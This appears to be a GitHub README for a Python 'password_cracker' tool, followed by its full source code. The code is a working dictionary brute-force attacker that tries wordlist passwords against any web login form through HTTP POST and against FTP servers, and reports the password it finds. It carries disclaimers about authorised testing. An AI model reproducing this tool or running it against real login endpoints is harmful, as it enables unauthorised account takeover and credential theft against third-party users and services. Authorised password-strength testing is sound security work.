# password_cracker
<!-- 
\______   \_____    ______ ________  _  _____________  __| _/ \_   ___ \____________    ____ |  | __ ___________ 
 |     ___/\__  \  /  ___//  ___/\ \/ \/ /  _ \_  __ \/ __ |  /    \  \/\_  __ \__  \ _/ ___\|  |/ // __ \_  __ \
 |    |     / __ \_\___ \ \___ \  \     (  <_> )  | \/ /_/ |  \     \____|  | \// __ \\  \___|    <\  ___/|  | \/
 |____|    (____  /____  >____  >  \/\_/ \____/|__|  \____ |   \______  /|__|  (____  /\___  >__|_ \\___  >__|   
                \/     \/     \/                          \/          \/            \/     \/     \/    \/        -->
This tool is designed to test password strength by attempting authentication against different targets using automated techniques. It supports multiple attack vectors, including:

HTTP POST requests – Useful for testing web-based login forms and APIs

Local authentication tests – For validating password policies on local systems

FTP authentication – For assessing legacy or misconfigured FTP services

The tool can be configured with custom wordlists, request parameters, and target settings, making it suitable for controlled security testing and educational purposes.

⚠️ Warning & Responsibility
This software should only be used on systems you own or have explicit authorization to test. Unauthorized use against third-party systems may be illegal and unethical.

USE AT YOUR OWN RISK.
The author assumes no responsibility for misuse, damage, or legal consequences resulting from improper use.





The code:

# password

#!/usr/bin/env python3
"""
Password Cracker Tool
=====================
A dictionary-based password cracker for educational purposes and security testing.

WARNING: This tool is for educational purposes and testing systems you own only.
Unauthorized access to computer systems is illegal and unethical.
"""

import sys
import time
import requests
from urllib.parse import urlparse

class PasswordCracker:
    def __init__(self, password_file="passowrds.txt"):
        """Initialize the password cracker with a password dictionary file."""
        self.password_file = password_file
        self.passwords = []
        self.load_passwords()
        
    def load_passwords(self):
        """Load passwords from the password dictionary file."""
        try:
            with open(self.password_file, 'r', encoding='utf-8', errors='ignore') as f:
                self.passwords = [line.strip() for line in f if line.strip()]
            print(f"[+] Loaded {len(self.passwords)} passwords from {self.password_file}")
        except FileNotFoundError:
            print(f"[-] Error: {self.password_file} not found!")
            sys.exit(1)
        except Exception as e:
            print(f"[-] Error reading {self.password_file}: {e}")
            sys.exit(1)
    
    def crack_local(self, email, test_function=None):
        """
        Crack password using a custom test function (for local testing).
        
        Args:
            email: Target email/username
            test_function: Function that takes (email, password) and returns True if correct
        """
        if test_function is None:
            print("[-] No test function provided for local cracking")
            return None
            
        print(f"\n[+] Attempting to crack password for: {email}")
        print(f"[+] Trying {len(self.passwords)} passwords...\n")
        
        attempts = 0
        for password in self.passwords:
            attempts += 1
            if attempts % 10 == 0:
                print(f"[*] Attempted {attempts}/{len(self.passwords)} passwords...", end='\r')
            
            try:
                if test_function(email, password):
                    print(f"\n[+] SUCCESS! Password found: {password}")
                    print(f"[+] Attempts: {attempts}")
                    return password
            except Exception as e:
                print(f"\n[-] Error during test: {e}")
                continue
        
        print(f"\n[-] Password not found in dictionary after {attempts} attempts")
        return None
    
    def crack_web_form(self, email, login_url, username_field="email", password_field="password"):
        """
        Attempt to crack password via web form POST request.
        
        WARNING: Only use this on systems you own or have explicit permission to test.
        
        Args:
            email: Target email/username
            login_url: URL of the login endpoint
            username_field: Name of the username/email form field
            password_field: Name of the password form field
        """
        print(f"\n[+] Attempting to crack password for: {email}")
        print(f"[+] Target URL: {login_url}")
        print(f"[+] Trying {len(self.passwords)} passwords...\n")
        
        attempts = 0
        session = requests.Session()
        
        for password in self.passwords:
            attempts += 1
            if attempts % 5 == 0:
                print(f"[*] Attempted {attempts}/{len(self.passwords)} passwords...", end='\r')
                time.sleep(0.5)  # Rate limiting
            
            try:
                data = {
                    username_field: email,
                    password_field: password
                }
                
                response = session.post(login_url, data=data, timeout=10, allow_redirects=False)
                
                # Check for successful login indicators
                if response.status_code in [200, 302, 301]:
                    # Look for common success indicators
                    if any(indicator in response.text.lower() for indicator in ['dashboard', 'welcome', 'logout', 'profile']):
                        if 'login' not in response.url.lower() and 'signin' not in response.url.lower():
                            print(f"\n[+] POSSIBLE SUCCESS! Password: {password}")
                            print(f"[+] Status Code: {response.status_code}")
                            print(f"[+] Attempts: {attempts}")
                            return password
                
            except requests.exceptions.RequestException as e:
                continue
            except Exception as e:
                continue
        
        print(f"\n[-] Password not found in dictionary after {attempts} attempts")
        return None
    
    def crack_ftp(self, email, host, port=21):
        """
        Attempt to crack FTP password.
        
        WARNING: Only use this on systems you own or have explicit permission to test.
        """
        try:
            from ftplib import FTP
        except ImportError:
            print("[-] FTP library not available")
            return None
        
        print(f"\n[+] Attempting to crack FTP password for: {email}")
        print(f"[+] Target: {host}:{port}")
        print(f"[+] Trying {len(self.passwords)} passwords...\n")
        
        attempts = 0
        for password in self.passwords:
            attempts += 1
            if attempts % 10 == 0:
                print(f"[*] Attempted {attempts}/{len(self.passwords)} passwords...", end='\r')
            
            try:
                ftp = FTP()
                ftp.connect(host, port, timeout=5)
                ftp.login(email, password)
                print(f"\n[+] SUCCESS! FTP Password found: {password}")
                print(f"[+] Attempts: {attempts}")
                ftp.quit()
                return password
            except Exception:
                continue
        
        print(f"\n[-] Password not found in dictionary after {attempts} attempts")
        return None


def demo_local_test():
    """Demo function showing how to use with a local test function."""
    # Example: Simple dictionary for demonstration
    known_passwords = {
        "test@example.com": "password123",
        "admin@test.com": "admin"
    }
    
    def test_password(email, password):
        return known_passwords.get(email) == password
    
    return test_password


def main():
    """Main function to run the password cracker."""
    print("=" * 60)
    print("Password Cracker Tool")
    print("=" * 60)
    print("\nWARNING: This tool is for educational purposes and")
    print("testing systems you own ONLY. Unauthorized access is illegal.\n")
    
    # Get email input
    email = input("Enter email/username: ").strip()
    if not email:
        print("[-] Email is required!")
        sys.exit(1)
    
    # Choose cracking method
    print("\nCracking Methods:")
    print("1. Local Test Function (Demo)")
    print("2. Web Form (HTTP POST)")
    print("3. FTP")
    print("4. Exit")
    
    choice = input("\nSelect method (1-4): ").strip()
    
    cracker = PasswordCracker()
    
    if choice == "1":
        # Demo mode
        print("\n[*] Running in demo mode with test passwords...")
        test_func = demo_local_test()
        cracker.crack_local(email, test_func)
    
    elif choice == "2":
        login_url = input("Enter login URL: ").strip()
        if not login_url:
            print("[-] Login URL is required!")
            sys.exit(1)
        cracker.crack_web_form(email, login_url)
    
    elif choice == "3":
        host = input("Enter FTP host: ").strip()
        if not host:
            print("[-] FTP host is required!")
            sys.exit(1)
        port = input("Enter FTP port (default 21): ").strip()
        port = int(port) if port else 21
        cracker.crack_ftp(email, host, port)
    
    elif choice == "4":
        print("Exiting...")
        sys.exit(0)
    
    else:
        print("[-] Invalid choice!")
        sys.exit(1)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[-] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[-] Error: {e}")
        sys.exit(1)
